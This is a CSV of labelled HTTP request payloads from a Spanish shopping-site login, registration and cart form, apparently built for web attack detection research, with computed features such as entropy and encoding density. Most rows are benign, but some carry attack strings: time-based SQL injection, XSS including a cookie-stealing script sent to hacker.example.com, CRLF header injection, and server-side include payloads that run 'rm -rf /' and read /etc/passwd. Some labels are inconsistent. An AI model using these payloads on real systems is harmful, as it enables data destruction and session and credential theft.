row_id,payload,category,needs_review,length,has_quotes,has_angle_brackets,has_path,has_cmd,priority,kb_family,char_len_computed,length_matches_computed,line_break_count,pipe_field_count_approx,space_ratio,digit_ratio,unique_char_ratio,shannon_entropy_bits,has_http_version_tail,contains_http_version_token,field_delimiter_style,quoted_csv_like_wrapping,application_injection_context,application_context_unknown_reason,percent_escape_count,percent_encoding_density,encoding_surface_class,has_double_percent_encoding,has_null_percent,has_crlf_encoded_or_literal,heuristic_pattern_band,label_consistency_flag
3361,insertar | 4459 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium,cmd,37,yes,0,3,0.13513513513513514,0.16216216216216217,0.5945945945945946,4.247030650103631,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3362,insertar | 4459 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5365853658536586,4.107280664890278,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3363,"entrar | maxin | 44,c,0n3/exo | off | Entrar HTTP/1.1",cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.11320754716981132,0.4528301886792453,4.269727765598213,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3364,entrar | maxin | 5at5s | off | Entrar HTTP/1.1,cmd,no,46,0,0,0,1,medium,cmd,46,yes,0,5,0.1956521739130435,0.08695652173913043,0.45652173913043476,4.000972825245975,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3365,insertar | Pasar por caja HTTP/1.1,cmd,no,34,0,0,0,1,medium,cmd,34,yes,0,2,0.14705882352941177,0.058823529411764705,0.5588235294117647,3.9339545780481737,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3366,insertar | 5878 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5238095238095238,4.124195400663521,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3367,insertar | 5878 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5365853658536586,4.107280664890278,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3368,"registro | chi-yin | zAfIo | Amael | Casselle Cullell | vacey@madrid2012.kw | 70541156H | Plza. Agueda Diez, 25 10?B| | Oria | 19415 | Cantabria | 0891865623205844 | Registrar HTTP/1.1",cmd,no,184,0,0,0,1,low,cmd,184,yes,0,14,0.16304347826086957,0.21195652173913043,0.2717391304347826,4.938782825828009,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3369,"registro | chi-yin | zAfIo | Amael | Casselle Cullell | vacey@madrid2012.kw | 70541156H | Plza. Agueda Diez, 25 10?B | Oria | 19415 | Cantabria | %20 | Registrar HTTP/1.1",cmd,no,170,0,0,0,1,low,cmd,170,yes,0,13,0.17647058823529413,0.14705882352941177,0.28823529411764703,4.857949538111537,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.0058823529411764705,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3370,"registro | chi-yin | zAfIo | Amael | Casselle Cullell | vacey@madrid2012.kw | 70541156H | Plza. Agueda Diez, 25 10?B | Fuentes* de R*opel | 19415 | Cantabria | 0891865623205844 | Registrar HTTP/1.1",cmd,no,197,0,0,0,1,low,cmd,197,yes,0,13,0.16243654822335024,0.19796954314720813,0.2639593908629442,5.000467919825282,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3371,"registro | chi-yin | zAfIo | Amael | Casselle Cullell | vacey@madrid2012.kw | 70541156H | Plza. Agueda Diez, 25 10?B | Oria | 19415 | Cantabria | 0891865623205844 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low,cmd,183,yes,0,13,0.16393442622950818,0.21311475409836064,0.273224043715847,4.9445894905520404,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3372,entrar | aguinsky@40 | ma-ternal | off | Entrar HTTP/1.1,cmd,no,56,0,0,0,1,medium,cmd,56,yes,0,5,0.16071428571428573,0.07142857142857142,0.5,4.36979253877157,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3373,entrar | kea?ts | ma-ternal | off | Entrar HTTP/1.1,cmd,no,51,0,0,0,1,medium,cmd,51,yes,0,5,0.17647058823529413,0.0392156862745098,0.43137254901960786,4.039908068124801,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3374,entrar | aguinsky | ma-ternal | off | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.03773584905660377,0.4716981132075472,4.208986615619465,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3375,insertar%7C | 2293 | Pasar por caja HTTP/1.1,cmd,no,44,0,0,0,1,medium,cmd,44,yes,0,3,0.1590909090909091,0.1590909090909091,0.5681818181818182,4.294406052072751,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.022727272727272728,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3376,insertar | 2293 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5238095238095238,4.124195400663521,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3377,insertar | 2293 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5365853658536586,4.107280664890278,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3378,"registro | letsome9 | simple | Perfecta | Lowery Volta | seel@indorec.ge | 05171912V | C/ Agustina Fierra, 49,  | Pozo-Lorente | 46715%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | Burgos | 6556979183874771 | Registrar HTTP/1.1",cmd,no,235,0,0,0,1,low,cmd,235,yes,0,13,0.1276595744680851,0.20425531914893616,0.2127659574468085,5.05705199115795,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",10,0.0425531914893617,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3379,"registro | letsome9 | simple | Perfecta | Lowery Volta | seel@indorec.ge | 05171912V | C/ Agustina Fierra, 49,  | Villabasta de Vald/?avia | 46715 | Burgos | 6556979183874771 | Registrar HTTP/1.1",cmd,no,195,0,0,0,1,low,cmd,195,yes,0,13,0.1641025641025641,0.17435897435897435,0.24102564102564103,4.806525710947907,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3380,"registro | letsome9 | simple | Perfecta | Lowery Volta | seel@indorec.ge | 05171912V | C/ Agustina Fierra, 49,  | Pozo-Lorente | 46715 | Burgos | 6556979183874771 | Registrar HTTP/1.1",cmd,no,183,0,0,0,1,low,cmd,183,yes,0,13,0.16393442622950818,0.18579234972677597,0.25136612021857924,4.785734319276103,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3381,"');waitfor delay '0:0:15';-- | linebarg | 6A6ejo | Adiberto | Baro Guizasola | knoch@cortinasartesol.rs | 40660740Y | Calle Rio Nervion, 124  | Villalbilla | 10269 | Asturias | 3612762380089374 | Registrar HTTP/1.1",sql,no,214,1,0,0,1,low,sql,214,yes,0,13,0.14953271028037382,0.18691588785046728,0.2523364485981308,4.990986859594277,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,time_based_or_delay_primitive,pattern_supports_family
3382,"registro | linebarg | 6A6ejo | Adiberto | Baro Guizasola | knoch@cortinasartesol.rs | 981864601 | Calle Rio Nervion, 124  | Villalbilla | 10269 | Asturias | 3612762380089374 | Registrar HTTP/1.1",cmd,no,194,0,0,0,1,low,cmd,194,yes,0,13,0.15463917525773196,0.19072164948453607,0.2268041237113402,4.759016221983802,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3383,entrar | chinhany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | clavadura | off | Entrar HTTP/1.1,cmd,no,104,0,0,0,1,low,cmd,104,yes,0,5,0.08653846153846154,0.25,0.3942307692307692,4.991748824486709,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",5,0.04807692307692308,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
3384,"entrar | chinh | za1pa8i'm,osnas | off | Entrar HTTP/1.1",cmd,no,56,1,0,0,1,medium,cmd,56,yes,0,5,0.16071428571428573,0.07142857142857142,0.4642857142857143,4.327107547243656,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3385,entrar | chinh | clavadura | off | Entrar HTTP/1.1,cmd,no,50,0,0,0,1,medium,cmd,50,yes,0,5,0.18,0.04,0.46,4.113786320494366,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3386,insertar | 3263 | %7C HTTP/1.1,cmd,no,30,0,0,0,1,medium,cmd,30,yes,0,3,0.16666666666666666,0.23333333333333334,0.7,4.186569246460625,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",1,0.03333333333333333,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3387,insertar | 3263 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5365853658536586,4.107280664890278,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3388,"entrar | ,brittani | 1elos1 | on | Entrar HTTP/1.1",cmd,no,50,0,0,0,1,medium,cmd,50,yes,0,5,0.18,0.08,0.4,3.945979129983103,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3389,entrar | grausso | 1elos1 | on | Entrar HTTP/1.1,cmd,no,48,0,0,0,1,medium,cmd,48,yes,0,5,0.1875,0.08333333333333333,0.3958333333333333,3.894160094553,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3390,insertar | 6908 | Confirmarsessionid=12312312& username=<script>document.location='http://hacker .example.com/cgi-bin/cookiesteal.cgi?'+ document.cookie</script> HTTP/1.1,xss,no,170,1,1,0,1,low,xss,170,yes,0,3,0.047058823529411764,0.08235294117647059,0.25882352941176473,4.956475079695874,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,script_tag_evidence,pattern_supports_family
3391,insertar | 6908 | Confirmar/ HTTP/1.1,cmd,no,37,0,0,0,1,medium,cmd,37,yes,0,3,0.13513513513513514,0.16216216216216217,0.6216216216216216,4.301084704157685,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3392,insertar | 6908 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.6388888888888888,4.291879432707956,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3393,%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E | kamran | +sacio | Bladimiro | Barreda Icaza | cserhalmi@ankawaelda.net | 41585257S | C/ Rossello 154 13-H | Atez | 31264 | Cantabria | 9078165703256769 | Registrar HTTP/1.1,cmd,no,227,0,0,0,1,low,cmd,227,yes,0,13,0.1277533039647577,0.22026431718061673,0.20704845814977973,5.018252925996707,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",10,0.04405286343612335,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3394,registro | kamran | +sacio | Bladimiro | Barreda Icaza | cserhalmi@ankawaelda.net | 41585257S | C/ Rossello 154 13-H | Atez | 31264 | Burg*.os | 9078165703256769 | Registrar HTTP/1.1,cmd,no,182,0,0,0,1,low,cmd,182,yes,0,13,0.15934065934065933,0.1978021978021978,0.24725274725274726,4.862662452600387,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3395,registro | kamran | +sacio | Bladimiro | Barreda Icaza | cserhalmi@ankawaelda.net | 41585257S | C/ Rossello 154 13-H | Atez | 31264 | Cantabria | 9078165703256769 | Registrar HTTP/1.1,cmd,no,183,0,0,0,1,low,cmd,183,yes,0,13,0.15846994535519127,0.19672131147540983,0.24043715846994534,4.814672988714455,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3396,entrar | gamaliel | embelesar | on | Entrar HTTP/1.1,cmd,no,52,0,0,0,1,medium,cmd,52,yes,0,5,0.17307692307692307,0.038461538461538464,0.40384615384615385,3.991439305821512,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3397,insertar | 1400| | Pasar por caja HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,4,0.16666666666666666,0.14285714285714285,0.5,4.040629329131927,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3398,insertar | 1400 | paros%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id=2 HTTP/1.1,cmd,no,109,0,0,0,1,low,cmd,109,yes,0,3,0.045871559633027525,0.23853211009174313,0.3669724770642202,4.882793627288136,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",11,0.10091743119266056,ascii_with_percent_encoding,False,False,False,unknown,no_keyword_pattern_matched
3399,insertar | 1400 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5,4.0586028410882005,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3400,insertar | 1400 | Pasar por caja HTTP/1.1,cmd,no,41,0,0,0,1,medium,cmd,41,yes,0,3,0.17073170731707318,0.14634146341463414,0.5121951219512195,4.0400882867887296,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3401,"registro | whalen54 | guapote | ','0');waitfor delay '0:0:15';-- | Agea Genova | fegan@unidadesdeventilacion.az | 39065739D | Fortaleza Hacho 199 11H | Espinosa de los Monteros | 11610 | Cuenca | 3212381335432418 | Registrar HTTP/1.1",sql,no,233,1,0,0,1,low,sql,233,yes,0,13,0.1459227467811159,0.18454935622317598,0.22317596566523606,4.987450820504256,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,time_based_or_delay_primitive,pattern_supports_family
3402,"registro | whalen54 | guapote | Abel | Saipe Herna,n_do | fegan@unidadesdeventilacion.az | 39065739D | Fortaleza Hacho 199 11H | Espinosa de los Monteros | 11610 | Cuenca | 3212381335432418 | Registrar HTTP/1.1",cmd,no,210,0,0,0,1,low,cmd,210,yes,0,13,0.1523809523809524,0.18095238095238095,0.22857142857142856,4.841471677960694,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3403,registro | whalen54 | guapote | Abel | Agea Genova | fegan@unidadesdeventilacion.az | 39065739D | Fortaleza Hacho 199 11H | Espinosa de los Monteros | 11610 | Cuenca | 3212381335432418 | Registrar HTTP/1.1,cmd,no,205,0,0,0,1,low,cmd,205,yes,0,13,0.15609756097560976,0.18536585365853658,0.22439024390243903,4.809679458031814,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3404,"registro | winnie | 1ArZ5ElA | Pomponio | Aboitiz Monestel | mcnaughton@queinvento.gg<!--#include file=""archivo_secreto"" --> | 86852947W | Calle Gerardo Rueda, 68, 3?C | Foradada | 43411 | Badajoz | 4587587495208642 | Registrar HTTP/1.1",sql,no,236,1,1,0,1,low,sql,236,yes,0,13,0.13559322033898305,0.15254237288135594,0.2584745762711864,5.188476131019279,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3405,registro | winnie | 1ArZ5ElA | Pomponio | Aboitiz Monestel | mcnaughton@queinvento.gg | 86852947W | any%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727 | Foradada | 43411 | Badajoz | 4587587495208642 | Registrar HTTP/1.1,cmd,no,223,0,0,0,1,low,cmd,223,yes,0,13,0.11659192825112108,0.2556053811659193,0.24663677130044842,5.167352153230308,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",5,0.02242152466367713,ascii_with_percent_encoding,False,False,False,header_injection_token_evidence,pattern_supports_family
3406,"registro | winnie | 1ArZ5ElA | Pomponio | Aboitiz Monestel | mcnaughton@queinvento.gg | 86852947W | Calle Gerardo Rueda, 68, 3?C | Foradada | 43411 | Badajoz | 4587587495208642 | Registrar HTTP/1.1",cmd,no,197,0,0,0,1,low,cmd,197,yes,0,13,0.15228426395939088,0.18274111675126903,0.2639593908629442,5.001667101165128,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3407,"<!--#exec cmd=""rm -rf /;cat /etc/passwd"" --> | world.fa | entremeter | on | Entrar HTTP/1.1",sql,no,91,1,1,0,1,low,sql,91,yes,0,5,0.15384615384615385,0.02197802197802198,0.3516483516483517,4.550762977858291,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3408,"entrar | r,uyan?'t | entremeter | on | Entrar HTTP/1.1",cmd,no,54,1,0,0,1,medium,cmd,54,yes,0,5,0.16666666666666666,0.037037037037037035,0.3888888888888889,3.9073945689623955,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3409,entrar | world.fa | entremeter | on | Entrar HTTP/1.1,cmd,no,53,0,0,0,1,medium,cmd,53,yes,0,5,0.16981132075471697,0.03773584905660377,0.37735849056603776,3.906310314110665,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3410,insertar | 4613 | Confirmar| HTTP/1.1,cmd,no,37,0,0,0,1,medium,cmd,37,yes,0,4,0.13513513513513514,0.16216216216216217,0.5945945945945946,4.206225920256957,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3411,insertar | 4613 | Pasar por caja/ HTTP/1.1,cmd,no,42,0,0,0,1,medium,cmd,42,yes,0,3,0.16666666666666666,0.14285714285714285,0.5238095238095238,4.106221888707248,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3412,insertar | 4613 | Confirmar HTTP/1.1,cmd,no,36,0,0,0,1,medium,cmd,36,yes,0,3,0.1388888888888889,0.16666666666666666,0.6111111111111112,4.215354779870082,True,True,has_pipes,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3413,registro | tudor | 28a2quizo | Camilo | Eremian De la Sota | lauterbach@nanogenerador.ic | 24061408G | Call+e El Rincon 69  | Ciudad Real | 08553 | Badajoz | 5945196331395771 | Registrar HTTP/1.1,cmd,no,195,0,0,0,1,low,cmd,195,yes,0,13,0.16923076923076924,0.18461538461538463,0.23076923076923078,4.81774142489632,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
3414,"registro | tudor | 28a2quizo | Camilo | Eremian De la Sota | lauterbach@nanogenerador.ic | 24061408G | Mesa 169,  | Ciudad Real | 08553 | Badajoz | 5945196331395771 | Registrar HTTP/1.1",cmd,no,185,0,0,0,1,low,cmd,185,yes,0,13,0.16756756756756758,0.2,0.24864864864864866,4.830420663554163,True,True,pipe_rich,False,unknown,"Source CSV does not name HTTP parameters, body schema, or insertion offsets; strings appear to embed proxy/log capture (e.g. HTTP version tail) rather than a single injection-point view.",0,0.0,ascii_plain,False,False,False,unknown,no_keyword_pattern_matched
